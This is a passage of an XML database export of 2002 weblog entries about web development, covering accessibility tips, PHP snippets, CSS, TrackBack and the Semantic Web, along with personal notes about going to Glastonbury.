&lt;dl&gt;
&lt;dt&gt;General&lt;/dt&gt;
&lt;dd&gt;Provides access to any meta tag information for the page, along with useful details such as the rendering mode used (Quirks or Standards compliant), the content-type and the last modified date.&lt;/dd&gt;
&lt;dt&gt;Forms&lt;/dt&gt;
&lt;dd&gt;Lists all of the form elements on the page along with their field name, type, contents and labal (if specified). This could be very useful for debugging form based web applications.&lt;/dd&gt;
&lt;dt&gt;Links&lt;/dt&gt;
&lt;dd&gt;Lists all of the links, form actions and related links (with the &amp;lt;link&amp;gt; tag) on the page.&lt;/dd&gt;
&lt;dt&gt;Media&lt;/dt&gt;
&lt;dd&gt;Shows a list of all media items used on the page, including images and embedded objects such as Flash files. Images can be viewed in a small preview page and saved using the &quot;Save As...&quot; button. The image file size and physical dimensions are also provided.&lt;/dd&gt;
&lt;dt&gt;Security&lt;/dt&gt;
&lt;dd&gt;Provides information on security certificates for the current page. This is the tab that pops up if you click the padlock icon in the bottom right hand corner of the browser.&lt;/dd&gt;
&lt;/dl&gt;
&lt;p&gt;All in all this is a very powerful tool - I'm surprised I hadn't noticed it sooner.&lt;/p&gt;</field>
		<field name="created">2002-06-24 18:42:11</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">85</field>
		<field name="title">Skipping over navigation</field>
		<field name="slug">skippingOverNavigation</field>
		<field name="body">&lt;p&gt;Day 11's accessibility tip is &lt;a href=&quot;http://diveintomark.org/archives/2002/06/24.html#day_11_skipping_over_navigation_links&quot;&gt;Skipping over navigation links&lt;/a&gt;, which suggests a compromise for people who did not or could not comply with &lt;a href=&quot;http://diveintomark.org/archives/2002/06/21.html#day_10_presenting_your_main_content_first&quot;&gt;Presenting your content first&lt;/a&gt;. I &lt;a href=&quot;http://www.bath.ac.uk/~cs1spw/blog/archive/2002/06/21/#presentingYourContentFirst&quot;&gt;altered my template&lt;/a&gt; to present content first on Friday, but before then I was using a skip-navigation link. I now have a skip-content-to-access-navigation link instead, a technique I borrwed from Mark's site but which he does not mention in today's tip.&lt;/p&gt;</field>
		<field name="created">2002-06-24 18:54:14</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">86</field>
		<field name="title">Some Python advocacy</field>
		<field name="slug">somePythonAdvocacy</field>
		<field name="body">&lt;p&gt;I just engaged in some &lt;a href=&quot;http://www.wmhub.net/forums/showthread.php?threadid=1844#post14650&quot;&gt;basic Python advocacy&lt;/a&gt;, during which I rolled out my all time favourite Python advocacy link: &lt;a href=&quot;http://www.linuxjournal.com/article.php?sid=3882&quot;&gt;Why Python?&lt;/a&gt; by Eric Raymond.&lt;/p&gt;</field>
		<field name="created">2002-06-24 19:21:25</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">87</field>
		<field name="title">PHP string tip</field>
		<field name="slug">phpTip</field>
		<field name="body">&lt;p&gt;I've lost count of the number of times I've posted this PHP tip on a forum somewhere, so I may as well blog it:&lt;/p&gt;

&lt;pre&gt;$string = &amp;lt;&amp;lt;&amp;lt;EOD
This string can contain both &quot;double&quot; and 'single' quotes,
and any variables such as $name will be interpolated (i.e 
replaced with their value). The string ends at the first 
occurence of the sequence of characters specified at the 
beginning after the &amp;lt;&amp;lt;&amp;lt;, like this:
EOD;&lt;/pre&gt;

&lt;p&gt;More on this feature can be found in the &lt;a href=&quot;http://www.php.net/manual/en/language.types.string.php#language.types.string.syntax.heredoc&quot; title=&quot;Strings: Heredoc&quot;&gt;PHP manual&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-06-24 20:12:19</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">88</field>
		<field name="title">Installing PHP and XSL on Windows</field>
		<field name="slug">installingPhpAndXslOnWindows</field>
		<field name="body">&lt;p&gt;I'm currently reinstalling PHP on my Windows machine, and in doing so I came across this tutorial: &lt;a href=&quot;http://shanx.com/php/xsl/getXsl.htm&quot;&gt;Installing XSL and PHP on Windows&lt;/a&gt;. The tutorial provides all the necessary files and instructions to get XSL working with minimum hassle. I've been meaning to play with XSL for some time, and this has provided me with just the boost I needed to give it a go.&lt;/p&gt;</field>
		<field name="created">2002-06-24 23:16:54</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">89</field>
		<field name="title">An IA process</field>
		<field name="slug">anIaProcess</field>
		<field name="body">&lt;p&gt;Anders Ramsay: &lt;a href=&quot;http://www.andersramsay.com/work/process/&quot; title=&quot;An IA Process&quot;&gt;How I work as an Information Architect&lt;/a&gt; (via &lt;a href=&quot;http://poorbuthappy.com/ease/000247.html&quot;&gt;Guide to Ease&lt;/a&gt;). An interesting overview of Information Architecture, including what it involves and how it can be aproached. The article also touches on Software Engineering related concepts such as project management and system design.&lt;/p&gt;</field>
		<field name="created">2002-06-24 23:39:42</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">90</field>
		<field name="title">Dot leaders in CSS</field>
		<field name="slug">dotLeadersInCss</field>
		<field name="body">&lt;p&gt;Via Brett Merkey on &lt;a href=&quot;http://two.pairlist.net/mailman/listinfo/css-discuss&quot;&gt;CSS Discuss&lt;/a&gt;: &lt;a href=&quot;http://home.tampabay.rr.com/bmerkey/examples/dot-leaders.html&quot;&gt;Dot Leaders without Tables&lt;/a&gt;. Dot Leaders is a publishing term that describes the rows of dots frequently used in tables of contents to connect a chapter title with its relevant page number on the other side of the page. Brett's CSS solution resizes elegantly to fit the page, and there isn't a table in sight. Brett's &lt;a href=&quot;http://home.tampabay.rr.com/bmerkey/&quot;&gt;site&lt;/a&gt; provides an assortment of other useful CSS resources, including a very handy CSS cheat sheet.&lt;/p&gt;</field>
		<field name="created">2002-06-25 00:34:52</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">91</field>
		<field name="title">Writing IM Bots</field>
		<field name="slug">writingImBots</field>
		<field name="body">&lt;p&gt;Via &lt;a href=&quot;http://boingboing.net/2002_06_01_archive.html#85196400&quot;&gt;Boing Boing&lt;/a&gt;: &lt;a href=&quot;http://www.wiredbots.com/tutorial.html&quot;&gt;How to make your own IM Bots&lt;/a&gt;. This tutorial explains how to write a bot for both MSN and AIM using Perl running on Windows/DOS. Perl modules are provided to handle the actual protocols, and sample code is available to help you get started.&lt;/p&gt;</field>
		<field name="created">2002-06-25 10:00:06</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">92</field>
		<field name="title">Paul back soon</field>
		<field name="slug">paulBackSoon</field>
		<field name="body">&lt;a href=&quot;http://idontsmoke.co.uk/&quot;&gt;Paul Sowden&lt;/a&gt;: &lt;q cite=&quot;http://idontsmoke.co.uk/&quot;&gt;I've finished my exams and I hope to be back soon.&lt;/q&gt;</field>
		<field name="created">2002-06-25 10:03:12</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">93</field>
		<field name="title">Kuro5hin on AudioGalaxy</field>
		<field name="slug">kuro5hinOnAudioGalaxy</field>
		<field name="body">&lt;p&gt;Kuro5hin are running a &lt;a href=&quot;http://www.kuro5hin.org/story/2002/6/21/171321/675&quot;&gt;fascinating story on AudioGalaxy&lt;/a&gt;, written by one of the AudioGalaxy developers who wrote a large portion of the web interface code. It covers the history of the system and its recent demise at the hands of the RIAA, with quite a few technology pointers as well (they used PHP to serve over 90 million hits a day).&lt;/p&gt;</field>
		<field name="created">2002-06-25 13:28:49</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">94</field>
		<field name="title">Using colour safely</field>
		<field name="slug">usingColourSafely</field>
		<field name="body">&lt;p&gt;Mark's latest tip is up: &lt;a href=&quot;http://diveintomark.org/archives/2002/06/25.html#day_12_using_color_safely&quot;&gt;Using color safely&lt;/a&gt;. I'm aware of the rule that you should never use only colour as an indicator of something in a user interface, but I had completely forgotten that my own links on this blog were a classic example of that - all that distinguished them from the rest of the page was a difference in colour. I've now turned underlines back on for all links except those in the entry footers (which looked ugly with underlines), based on the principle that the text and position of the footer links should be enough to explain their purposes even without the underline.&lt;/p&gt;</field>
		<field name="created">2002-06-25 15:00:16</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">95</field>
		<field name="title">SitePoint CSS guide</field>
		<field name="slug">sitepointCssGuide</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.sitepoint.com/&quot;&gt;SitePoint&lt;/a&gt; have a good new &lt;a href=&quot;http://www.webmasterbase.com/article/379/46&quot; title=&quot;HTML Utopia -- Designing Without Tables: Part 2&quot;&gt;article on CSS layout&lt;/a&gt;, which includes some useful tips on how to use &lt;code&gt;position: float&lt;/code&gt; and &lt;code&gt;position: absolute&lt;/code&gt; to create columns on a page, as well as some tips on providing Netscape 4 with only basic CSS rules and an example of a PHP browser detection script.&lt;/p&gt;</field>
		<field name="created">2002-06-25 15:24:18</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">96</field>
		<field name="title">Oh ffs...</field>
		<field name="slug">ohFfs</field>
		<field name="body">&lt;p&gt;Slashdot: &lt;a href=&quot;http://slashdot.org/article.pl?sid=02/06/25/1316255&quot;&gt;Shocked, Shocked at Payola&lt;/a&gt;. This is just tragic. American record companies are all upset about the huge amounts of money they have to spend bribing commercial radio stations to play their music... but at the same time the RIAA are killing off internet radio and p2p file sharing, activities that give bands exposure for free! OK, file sharing allows people to keep the copies they download which is something the RIAA have justification to be cautious about, but killing internet radio and then complaining about the costs of promotion on commercial radio is just farcical.&lt;/p&gt;

&lt;p&gt;Incidentally, &lt;a href=&quot;http://www.salon.com/ent/feature/2001/03/14/payola/index.html&quot; title=&quot;Pay for play&quot;&gt;this article&lt;/a&gt; on Salon explains the sorry state of American commercial radio in detail, and in doing so helped me understand why internet radio is such a big deal in the States.&lt;/p&gt;</field>
		<field name="created">2002-06-25 18:04:57</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">97</field>
		<field name="title">Semant-O-Matic</field>
		<field name="slug">semantOMatic</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.idlewords.com/semantic/&quot;&gt;Semant-O-Matic&lt;/a&gt; - an experimental blog search engine. This is an impressive technology demonstration. The engine indexes eleven weblogs over the period of four months (March to June 2002) using a technique called &quot;latent semantic indexing&quot; or &lt;acronym title=&quot;Latent Semantic Indexing&quot;&gt;LSI&lt;/acronym&gt;. A full explanation is provided &lt;a href=&quot;http://www.idlewords.com/semantic/about.php&quot;&gt;on the site&lt;/a&gt; but this basically means that you can type in a term such as &quot;hobbit&quot; and recieve a bunch of results about related topics (i.e Lord of the Rings) that don't necessarily have to mention the word itself.&lt;/p&gt;

&lt;p&gt;I've been &lt;a href=&quot;http://www.w3.org/2001/sw/&quot; title=&quot;W3C Semantic Web&quot;&gt;doing&lt;/a&gt; &lt;a href=&quot;http://www.newarchitectmag.com/documents/s=2453/new1020218556549/index.html&quot; title=&quot;New Architect: The Languages of the Semantic Web&quot;&gt;some&lt;/a&gt; &lt;a href=&quot;http://searchenginewatch.com/searchday/02/sd0320-owl.html&quot; title=&quot;Search Day: On the Road to the Semantic Web&quot;&gt;reading&lt;/a&gt; on the semantic web recently and it looks like the way things are headed - Semant-O-Matic provides an easily understood demonstration of why topics like metadata are becoming so important.&lt;/p&gt;</field>
		<field name="created">2002-06-25 23:57:57</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">98</field>
		<field name="title">The 5k</field>
		<field name="slug">the5k</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.the5k.org/&quot;&gt;The 5k&lt;/a&gt; is an annual competition in which entrants must create the most impressive web site in 5k or less. This year's &lt;a href=&quot;http://www.the5k.org/list.asp&quot;&gt;competition entries&lt;/a&gt; are now online and the quality of the entries is even higher than the previous two years. My initial favourite is &lt;a href=&quot;http://www.the5k.org/description.asp/entry_id=946&quot;&gt;Wolfenstein 5K&lt;/a&gt;, a texture mapped first person shooter implemented in 5119 bytes of cross browser javascript (I tested it in Mozilla and IE6, and the author claims it runs in Netscape 4).&lt;/p&gt;</field>
		<field name="created">2002-06-26 00:19:49</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">99</field>
		<field name="title">XML in Mozilla</field>
		<field name="slug">xmlInMozilla</field>
		<field name="body">&lt;p&gt;WebReference: &lt;a href=&quot;http://www.webreference.com/xml/column58/&quot;&gt;XML in Mozilla 1.0&lt;/a&gt;. A quick summary of the XML technologies available with Mozilla 1.0, code samples not included.&lt;/p&gt;</field>
		<field name="created">2002-06-26 10:56:11</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">100</field>
		<field name="title">EuroPython starts</field>
		<field name="slug">euroPythonStarts</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.europython.org/&quot;&gt;EuroPython 2002&lt;/a&gt; kicks off today, and the EuroPython site is hosting an &lt;a href=&quot;http://europython.zope.nl/interviews/entries/alex_martelli&quot;&gt;interview with Alex Martelli&lt;/a&gt; (comp.lang.python regular and author of the soon-to-be-released Python Cookbook). I haven't found anyone who's blogging the conference yet though.&lt;/p&gt;</field>
		<field name="created">2002-06-26 11:11:06</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">101</field>
		<field name="title">Slashdot on XWT</field>
		<field name="slug">slashdotOnXwt</field>
		<field name="body">&lt;p&gt;Slashdot has a &lt;a href=&quot;http://developers.slashdot.org/article.pl?sid=02/06/25/2154255&quot;&gt;story on XWT&lt;/a&gt; (&lt;a href=&quot;/~cs1spw/blog/archive/2002/06/16/#excitedAboutXwt&quot;&gt;mentioned previously&lt;/a&gt;). Adam Megacz, the author of the system, does an excellent job of defending and explaining the concepts of &lt;a href=&quot;http://www.xwt.org/&quot;&gt;XWT&lt;/a&gt; in the discussion thread attached to the article.&lt;/p&gt;</field>
		<field name="created">2002-06-26 11:40:41</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">102</field>
		<field name="title">PHP auto class inclusion</field>
		<field name="slug">phpAutoClassInclusion</field>
		<field name="body">&lt;p&gt;When developing PHP applications, I usually have a classes directory somewhere in which I keep all of my PHP classes ready for inclusion. I name the class files &lt;code&gt;ClassName.class.php&lt;/code&gt;. Normally I have a &lt;code&gt;common.inc.php&lt;/code&gt; file that is included in all of the scripts in my application and requires the classes needed by the application, but today I wrote a few lines of code that saves me from having to alter that file every time I write a new class:&lt;/p&gt;

&lt;pre&gt;&amp;lt;php
$classesDirectory = 'classes/';
$classesExtension = '.class.php';
// require_once all classes in that directory
$d = dir($classesDirectory);
while (false !== ($entry = $d-&amp;gt;read())) {
    // Check extension
    if (substr($entry, -(strlen($classesExtension))) == $classesExtension) {
        require_once($classesDirectory.$entry);
    }
}
$d-&amp;gt;close();
// print_r(get_declared_classes());
?&amp;gt;&lt;/pre&gt;

&lt;p&gt;It's nothing revolutionary, but it's already saving me development time by allowing me to save a file straight in to the directory and instantly have the new class available to all scripts in the application.&lt;/p&gt;</field>
		<field name="created">2002-06-26 14:17:37</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">103</field>
		<field name="title">Use real links</field>
		<field name="slug">useRealLinks</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://diveintomark.org/archives/2002/06/26.html#day_13_using_real_links&quot;&gt;Day 13: Using Real Links&lt;/a&gt; (or why you shouldn't use &lt;code&gt;javascript:&lt;/code&gt;). I'm ahead on this one - Scott Andrew &lt;a href=&quot;http://www.scottandrew.com/weblog/000284&quot;&gt;convinced me&lt;/a&gt; of the dangers of &lt;code&gt;javascript:&lt;/code&gt; a month ago and I designed my comments system with this in mind.&lt;/p&gt;</field>
		<field name="created">2002-06-26 14:57:38</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">104</field>
		<field name="title">Cetus links</field>
		<field name="slug">cetusLinks</field>
		<field name="body">&lt;p&gt;Useful resource: &lt;a href=&quot;http://www.cetus-links.org/&quot;&gt;Cetus Links&lt;/a&gt; - 18,244 Links on Objects &amp;amp; Components. I found them via their &lt;a href=&quot;http://www.cetus-links.org/oo_python.html&quot;&gt;Python page&lt;/a&gt;, which in itself lists over 200 Python resources split in to categories.&lt;/p&gt;</field>
		<field name="created">2002-06-26 15:30:39</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">105</field>
		<field name="title">Enterprise Application Architecture</field>
		<field name="slug">enterpriseApplicationArchitect</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.martinfowler.com/isa/index.html&quot;&gt;Enterprise Application Architecture&lt;/a&gt; by Martin Fowler: A fantastic book on Object Oriented patterns and how they can be applied to large software projects. The book is available on the web as a work-in-progress and I can safely say I've never found an online resource that has taught me more about software design. Literally 24 hours after finding it my head is swimming with design patterns, domain models and relational database mapping techniques, and I've already started using some of the patterns in my latest project. A big thanks to Captain Proton on the SitePoint forums for &lt;a href=&quot;http://www.sitepointforums.com/showthread.php?threadid=57712&amp;amp;pagenumber=2&quot; title=&quot;OOP abstraction layer&quot;&gt;pointing it out&lt;/a&gt; (and also for &lt;a href=&quot;http://www.sitepointforums.com/showthread.php?threadid=65290&quot; title=&quot;Help needed with PHP references stored as object properties&quot;&gt;helping me understand PHP references&lt;/a&gt; a few days ago). I thoroughly recommend this to anyone who is serious about learning Object Oriented design, or indeed any OO-capable language.&lt;/p&gt;</field>
		<field name="created">2002-06-26 23:12:45</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">106</field>
		<field name="title">Warchalking</field>
		<field name="slug">warchalking</field>
		<field name="body">&lt;p&gt;Warchalking now has its own website: &lt;a href=&quot;http://www.warchalking.org/&quot;&gt;Warchalking.org&lt;/a&gt;. Warchalking is one of those brilliant ideas that quickly takes the 'net (or at least parts of it) by storm. The basic idea is a set of symbols which can be chalked on walls in areas with a wireless network node to alert other geeks to the availability of bandwidth. I'd go in to it further but the site has as much information as anyone could possibly want on the subject.&lt;/p&gt;</field>
		<field name="created">2002-06-26 23:48:08</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">107</field>
		<field name="title">Gone to Glastonbury</field>
		<field name="slug">goneToGlastonbury</field>
		<field name="body">&lt;p&gt;&lt;strong&gt;Gone to Glastonbury&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;My girlfriend won tickets to &lt;a href=&quot;http://www.glastonbury-festivals.co.uk/&quot;&gt;Glastonbury&lt;/a&gt; from her local radio station (and backstage passes, which is nice). So off I go for four days of muddy hedonism - and hey, I might even get to see a few bands as well. I'll be back on Monday but I probably won't have recovered until Tuesday so no blog updates until then. Have a great weekend, I know I will ;)&lt;/p&gt;</field>
		<field name="created">2002-06-26 23:53:00</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">108</field>
		<field name="title">Back from Glastonbury</field>
		<field name="slug">backFromGlastonbury</field>
		<field name="body">&lt;p&gt;Back from Glastonbury. Blog catchup tonight, Glastonbury writeup tomorrow.&lt;/p&gt;</field>
		<field name="created">2002-07-01 23:33:10</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">109</field>
		<field name="title">Hixie goes open source</field>
		<field name="slug">hixieGoesOpenSource</field>
		<field name="body">&lt;p&gt;Hixie has &lt;a href=&quot;http://ln.hixie.ch/?start=1025477612&amp;amp;count=1&quot; title=&quot;Hixie&amp;apos;s Web log system is now available&quot;&gt;open sourced&lt;/a&gt; his Perl weblog system. It has some nice features but a pretty extensive &lt;a href=&quot;http://software.hixie.ch/applications/blog/README&quot; title=&quot;README file&quot;&gt;set of requirements&lt;/a&gt; (MySQL, CVS, Expat and a whole bunch of Perl modules). He has also added support for next and previous buttons at the bottom of each entry, but has not yet added &amp;lt;link&amp;gt; element support, as recently &lt;a href=&quot;http://diveintomark.org/archives/2002/06/20.html#day_9_providing_additional_navigation_aids&quot; title=&quot;Providing additional navigation aids&quot;&gt;described&lt;/a&gt; by Mark Pilgrim.&lt;/p&gt;</field>
		<field name="created">2002-07-01 23:33:38</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">110</field>
		<field name="title">How Wolfenstein 5k works</field>
		<field name="slug">howWolfenstein5kWorks</field>
		<field name="body">&lt;p&gt;I &lt;a href=&quot;http://www.bath.ac.uk/~cs1spw/blog/archive/2002/06/26/#the5k&quot;&gt;linked&lt;/a&gt; to the 5k entry &lt;a href=&quot;http://www.the5k.org/description.asp/entry_id=946&quot;&gt;Wolfenstein 5K&lt;/a&gt; the other day. Lee Semel, the author of the entry, has written &lt;a href=&quot;http://www.innofinity.com/5k/2002/&quot;&gt;an article&lt;/a&gt; describing how the impressive Javascript first person shooter works. The principle method used is the dynamic creation of XBM images using a 3D graphics technique known as raycasting (described in &lt;a href=&quot;http://www.permadi.com/tutorial/raycast/&quot; title=&quot;Ray-Casting Tutorial&quot;&gt;this tutorial&lt;/a&gt;). The author incorrectly states that Mozilla does not have the capacity to render XBMs - Wolfenstein 5K runs just fine in my version of Mozilla so I presume support has been added since he last tested it.&lt;/p&gt;
</field>
		<field name="created">2002-07-01 23:34:17</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">111</field>
		<field name="title">TrackBack</field>
		<field name="slug">trackBack</field>
		<field name="body">&lt;p&gt;MovableType have released version 2.21, which finally introduces support for mySQL and also comes with an intriguing new feature called &lt;a href=&quot;http://www.movabletype.org/trackback/&quot;&gt;TrackBack&lt;/a&gt;. I'm stil trying to figure out exactly what TrackBack is.. so far I've figured out that it invovles embedding RDF information directly in to your blog which can then be combined with a &quot;ping&quot; to other blogs to inform them that you have linked to them, and give them additional information about your blog for display on a special TrackBack section for each of their blog entries. Scott Andrew has already &lt;a href=&quot;http://www.scottandrew.com/weblog/000392&quot;&gt;implemented it&lt;/a&gt; and many other MovableType blogs are setting it up as well. TrackBack has &lt;a href=&quot;http://www.movabletype.org/trackback/&quot;&gt;its own blog&lt;/a&gt;, which has an &lt;a href=&quot;http://www.movabletype.org/trackback/archives/000510.html#more&quot; title=&quot;Other implementations of TrackBack&quot;&gt;interesting entry&lt;/a&gt; hinting that TrackBack could soon become part of a system for distributed taxonomies (a problem that &lt;a href=&quot;http://www.xfml.org/&quot;&gt;XFML&lt;/a&gt; is also looking to solve).&lt;/p&gt;

&lt;p&gt;I'm not completely convinced by TrackBack. The implementation includes RDF embedded in blog entries which breaks XHTML validation (a problem the trackBack developers &lt;a href=&quot;http://www.movabletype.org/trackback/archives/000512.html#000512&quot; title=&quot;TrackBack and XHTML Validation&quot;&gt;are already working on&lt;/a&gt; - could comments around the RDF data help here?) and I can't really see any advantages over standard referral tracking as implemented on &lt;a href=&quot;http://diveintomark.org/&quot;&gt;diveintomark&lt;/a&gt;. I plan to implement my own referral tracking system soon and I will almost certainly model it on Mark Pilgrim's, although I hope to provide additional information about the referral source gained by parsing their HTML. That said, I'm still trying to understand exactly how TrackBack works so I will reserve judgement until then.&lt;/p&gt;</field>
		<field name="created">2002-07-01 23:53:06</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">112</field>
		<field name="title">Arial and Helvetica</field>
		<field name="slug">arialAndHelvetica</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.ms-studio.com/articles.html&quot;&gt;The Scourge of Arial&lt;/a&gt; (via &lt;a href=&quot;http://www.zeldman.com/daily/0602b.html#aguirre&quot;&gt;Zeldman&lt;/a&gt;). An interesting short history of modern typefaces and how Arial become widespread despite being merely a poor imitation of Helvetica.&lt;/p&gt;</field>
		<field name="created">2002-07-01 23:56:59</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">113</field>
		<field name="title">PHP form problem</field>
		<field name="slug">phpFormProblem</field>
		<field name="body">&lt;p&gt;I'm suffering from a bizzare PHP bug. For some reason, POSTed form entries over a certain length are being lost when submitted to scripts running on this site. Here is a &lt;a href=&quot;http://www.bath.ac.uk/~cs1spw/demos/demo.php&quot;&gt;demo script&lt;/a&gt; which demonstrates the problem - try typing in a short chunk of text and it will submit fine, but anything long (seemingly over about 1300 characters) will be mysteriously lost. The server's &lt;a href=&quot;http://www.bath.ac.uk/~cs1spw/phpinfo.php&quot;&gt;PHP Info output&lt;/a&gt; is available. If you have any idea what could be causing this &lt;a href=&quot;contact/&quot; title=&quot;Contact Me&quot;&gt;drop me a line&lt;/a&gt; or add a comment to this entry.&lt;/p&gt;</field>
		<field name="created">2002-07-02 18:58:47</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">114</field>
		<field name="title">More tips from Mark</field>
		<field name="slug">moreTipsFromMark</field>
		<field name="body">&lt;p&gt;Time to catch up on Mark Pilgrim's &lt;a href=&quot;http://diveintomark.org/archives/rooms/30_days_to_a_more_accessible_weblog/index.html&quot;&gt;accessibility tips&lt;/a&gt;. Four have been added since I last checked, so I'll go through them in turn.&lt;/p&gt;
&lt;dl&gt;
&lt;dt&gt;&lt;a href=&quot;http://diveintomark.org/archives/2002/06/27.html#day_14_adding_titles_to_links&quot;&gt;Day 14: Adding titles to links&lt;/a&gt;&lt;/dt&gt;
&lt;dd&gt;I was been hoping Mark would mention this, as it is something I have been trying to do while unsure if I was getting it right. Mark's advice is simple - only use a title when the link text itself does not clearly explain where it will take you when read out of context.&lt;/dd&gt;
&lt;dt&gt;&lt;a href=&quot;http://diveintomark.org/archives/2002/06/28.html#day_15_defining_keyboard_shortcuts&quot;&gt;Day 15: Defining keyboard shortcuts&lt;/a&gt;&lt;/dt&gt;
&lt;dd&gt;Mark explain's the relatively unknown accesskey attribute  in HTML, and suggests a set of non-standard but commonly-used shortcuts. I will be adding this feature to my blog shortly.&lt;/dd&gt;
&lt;dt&gt;&lt;a href=&quot;http://diveintomark.org/archives/2002/07/01.html#day_16_not_opening_new_windows&quot;&gt;Day 16: Not opening new windows&lt;/a&gt;&lt;/dt&gt;
&lt;dd&gt;As a fanatical user of Mozilla's tabbed browsing feature this is a personal peeve of mine - links that open in a new window start a whole new Mozilla window running (which incurs a performance overhead on my older PC). That said, Phil Ringnalda &lt;a href=&quot;http://philringnalda.com/archives/002258.php&quot; title=&quot;Don&amp;apos;t open new windows unless...&quot;&gt;makes a valid case&lt;/a&gt; for using &lt;code&gt;target=&quot;_blank&quot;&lt;/code&gt; for links in popup windows as favoured by blogging comment systems, as links that open in the same window will result in a full web page loading in the small popup.&lt;/dd&gt;
&lt;dt&gt;&lt;a href=&quot;http://diveintomark.org/archives/2002/07/02.html#day_17_defining_acronyms&quot;&gt;Day 17: Defining acronyms&lt;/a&gt;&lt;/dt&gt;
&lt;dd&gt;This is the fun one - I've actually been working on something that relates to this for the past week or two and it's almost ready to be released on to the world. More on this shortly...&lt;/dd&gt;
&lt;/dl&gt;</field>
		<field name="created">2002-07-02 19:43:03</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">115</field>
		<field name="title">I want this book</field>
		<field name="slug">iWantThisBook</field>
		<field name="body">&lt;p&gt;Spotted on &lt;a href=&quot;http://www.meyerweb.com/&quot;&gt;MeyerWeb&lt;/a&gt;: Eric Meyer on &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; has been released. This is one book I'm really looking forward to getting (at least when I can afford it) - Eric is one of the world's leading authorities on CSS and the new book promises 13 full projects, with particular attention paid to CSS positioning. The &lt;a href=&quot;http://www.ericmeyeroncss.com/iloveme.html&quot; title=&quot;Eric Meyer on CSS - Advance Praise&quot;&gt;advance reviews&lt;/a&gt; as listed on the book's official site look very promising as well.&lt;/p&gt;</field>
		<field name="created">2002-07-02 20:15:41</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">116</field>
		<field name="title">More on TrackBack</field>
		<field name="slug">moreOnTrackBack</field>
		<field name="body">&lt;p&gt;Phil Ringnalda (now added to my blogroll) has posted his &lt;a href=&quot;http://philringnalda.com/archives/002259.php&quot; title=&quot;Third (and final?) idea for TrackBack and XHTML validation&quot;&gt;latest thoughts&lt;/a&gt; on TrackBack, and he seems to have come on an ideal solution to the problems &lt;a href=&quot;http://www.bath.ac.uk/~cs1spw/blog/archive/2002/07/01/#trackBack&quot;&gt;mentioned earlier&lt;/a&gt;. He is now considering keeping the TrackBack &lt;acronym title=&quot;Resource Description Framework&quot;&gt;RDF&lt;/acronym&gt; data in a seperate file referenced via a &amp;lt;link&amp;gt; tag. This gets around the validation problems and the weirdness of embedding &lt;acronym title=&quot;Resource Description Framework&quot;&gt;RDF&lt;/acronym&gt; in &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt; in one stroke, but it seems &lt;a href=&quot;http://www.blogger.com/&quot;&gt;Blogger&lt;/a&gt; may have a problem supporting it as it does not have the ability to generate external files.&lt;/p&gt;</field>
		<field name="created">2002-07-02 20:23:55</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">117</field>
		<field name="title">Guardian blogroll</field>
		<field name="slug">guardianBlogroll</field>
		<field name="body">&lt;p&gt;I'm listed on the &lt;a href=&quot;http://www.guardian.co.uk/weblog/special/0,10627,744914,00.html&quot;&gt;Guardian's weblog list&lt;/a&gt; :) The link is quite well hidden (in the Tech weblogs section) but it's still pretty cool. The list details some excellent blogs covering a large range of topics.&lt;/p&gt;</field>
		<field name="created">2002-07-02 21:34:43</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">118</field>
		<field name="title">ThinkGeek soap</field>
		<field name="slug">thinkGeekSoap</field>
		<field name="body">&lt;p&gt;ThinkGeek: &lt;q cite=&quot;http://www.thinkgeek.com/stuff/caffeine/5a65.shtml&quot;&gt;&lt;a href=&quot;http://www.thinkgeek.com/stuff/caffeine/5a65.shtml&quot; title=&quot;Shower Shock Caffeinated Soap&quot;&gt;The caffeine is absorbed through the skin...&lt;/a&gt;&lt;/q&gt;&lt;/p&gt;</field>
		<field name="created">2002-07-02 21:51:14</field>
